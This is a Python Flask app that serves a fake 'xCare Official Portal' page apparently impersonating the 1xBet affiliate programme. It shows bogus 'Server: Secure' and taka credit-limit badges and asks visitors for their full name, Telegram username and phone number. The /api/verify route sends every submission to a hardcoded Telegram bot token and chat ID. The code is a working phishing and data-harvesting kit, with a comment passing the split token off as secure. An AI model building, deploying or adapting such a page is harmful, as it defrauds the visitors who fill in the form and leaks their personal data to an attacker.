from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# টেলিগ্রাম কনফিগ (নিরাপদভাবে বিভক্ত)
T1 = "8540257283"
T2 = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
BOT_TOKEN = f"{T1}:{T2}"
CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Official Portal</title>
        <style>
            body { font-family: 'Segoe UI', sans-serif; background-color: #0b162c; color: white; margin: 0; padding: 0; overflow-x: hidden; }
            .header { padding: 12px 20px; display: flex; justify-content: space-between; border-bottom: 1px solid #1c2e4a; font-size: 11px; }
            .status { color: #4caf50; font-weight: bold; }
            
            .container { padding: 20px; }
            .label { font-size: 11px; color: #8fa3bf; text-transform: uppercase; margin: 20px 0 12px 0; display: block; letter-spacing: 1px; }
            
            /* কার্ড স্টাইল */
            .card { background: #162641; padding: 18px; border-radius: 12px; display: flex; align-items: center; margin-bottom: 12px; cursor: pointer; border: 1px solid #1c2e4a; transition: 0.2s; text-decoration: none; color: white; }
            .card:active { transform: scale(0.97); background: #1c2e4a; }
            .card-info b { display: block; font-size: 15px; margin-bottom: 2px; }
            .card-info span { font-size: 11px; color: #4caf50; }
            .arrow { margin-left: auto; color: #1976d2; font-size: 18px; }

            /* নতুন "লোগো" আইকন স্টাইল */
            .logo-icon { width: 42px; height: 42px; background: rgba(25, 118, 210, 0.1); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-right: 15px; border: 1px solid rgba(25, 118, 210, 0.2); }
            .logo-icon span { color: #1976d2; font-weight: bold; font-size: 16px; font-family: 'Courier New', monospace; letter-spacing: -1px; }

            /* মডাল স্টাইল */
            .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; }
            .sheet { position: fixed; bottom: -100%; left: 0; width: 100%; background: #0b162c; border-radius: 25px 25px 0 0; padding: 30px 20px; box-sizing: border-box; z-index: 200; border-top: 3px solid #1976d2; transition: 0.4s ease-out; }
            .sheet.show { bottom: 0; }
            
            .promo-card { background: linear-gradient(135deg, #0d47a1, #1976d2); padding: 20px; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
            .input-box { margin-bottom: 15px; }
            .input-box label { display: block; font-size: 11px; color: #8fa3bf; margin-bottom: 8px; text-transform: uppercase; }
            .input-box input { width: 100%; padding: 14px; background: #162641; border: 1px solid #253959; border-radius: 10px; color: white; box-sizing: border-box; outline: none; }
            .submit-btn { background: #1976d2; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(25, 118, 210, 0.3); }
        </style>
    </head>
    <body>
        <div class="header">
            <span class="status">● Server: Secure</span>
            <span style="color: #8fa3bf;">ID: 1XB-OFFICIAL</span>
        </div>

        <div class="container">
            <span class="label">Affiliate Application</span>
            <div class="card" onclick="openForm('1xBet Master Agent')">
                <div class="logo-icon"><span>xC</span></div>
                <div class="card-info"><b>Apply for Agent</b><span>Request via Form</span></div>
                <div class="arrow">➔</div>
            </div>

            <span class="label">1xbet affiliated program</span>
            <a href="https://t.me/Your_Affiliate_Support" class="card">
                <div class="logo-icon"><span style="color:#2ba6e1">TG</span></div>
                <div class="card-info"><b>Affiliated Support Team</b><span>Contact Support on Telegram</span></div>
                <div class="arrow">↗</div>
            </a>
            
            <span class="label">Help Center</span>
            <div class="card" onclick="window.location.href='mailto:support@1xpartners.com'">
                <div class="logo-icon"><span>@</span></div>
                <div class="card-info"><b>Email Helpdesk</b><span>support@1xpartners.com</span></div>
                <div class="arrow">↗</div>
            </div>
        </div>

        <div class="overlay" id="overlay" onclick="closeForm()"></div>
        <div class="sheet" id="sheetForm">
            <div class="promo-card">
                <small style="opacity:0.7; font-size:10px;">CREDIT LIMIT ESTIMATE</small>
                <h2 style="margin:5px 0; font-size: 28px;">৳ 5,450.00</h2>
                <div style="font-size:10px; color:#4caf50;">● Account Gateway: Live</div>
            </div>
            
            <h4 id="form_title" style="margin-bottom: 20px; color: #1976d2; font-size: 16px;">FORM</h4>
            
            <form id="mainForm">
                <input type="hidden" name="type" id="form_type">
                <div class="input-box"><label>FULL NAME</label><input type="text" name="name" placeholder="Official Name" required></div>
                <div class="input-box"><label>TELEGRAM USERNAME</label><input type="text" name="tg" placeholder="@username" required></div>
                <div class="input-box"><label>PHONE NUMBER</label><input type="text" name="ph" placeholder="01XXXXXXXXX" required></div>
                <button type="submit" class="submit-btn" id="sub_btn">LINK ACCOUNT</button>
            </form>
        </div>

        <script>
            function openForm(v) {
                document.getElementById('form_type').value = v;
                document.getElementById('form_title').innerText = v.toUpperCase() + ' FORM';
                document.getElementById('overlay').style.display = 'block';
                document.getElementById('sheetForm').classList.add('show');
            }
            function closeForm() {
                document.getElementById('sheetForm').classList.remove('show');
                setTimeout(()=>{ document.getElementById('overlay').style.display = 'none'; }, 400);
            }
            document.getElementById('mainForm').onsubmit = async (e) => {
                e.preventDefault();
                document.getElementById('sub_btn').innerText = 'PROCCESSING...';
                const d = Object.fromEntries(new FormData(e.target));
                const res = await fetch('/api/verify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(d)
                });
                if(res.ok) { alert('Submitted for review!'); location.reload(); }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    msg = f"📩 **New Verification Request**\n\n📌 Service: {d.get('type')}\n👤 Name: {d.get('name')}\n🆔 TG: {d.get('tg')}\n📱 Ph: {d.get('ph')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
